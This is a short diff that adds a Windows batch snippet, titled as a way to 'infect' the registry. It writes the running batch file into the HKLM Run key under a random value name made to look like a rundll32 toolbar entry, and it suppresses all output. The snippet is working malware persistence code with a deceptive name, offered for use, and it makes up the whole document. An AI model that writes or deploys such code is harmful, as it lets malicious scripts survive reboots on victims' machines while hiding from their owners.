@@ -1,0 +1,6 @@
+Infect Registery with currectly rrunning batchfile:
+
+
+set valinf="rundll32_%random%_toolbar"
+set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
+reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
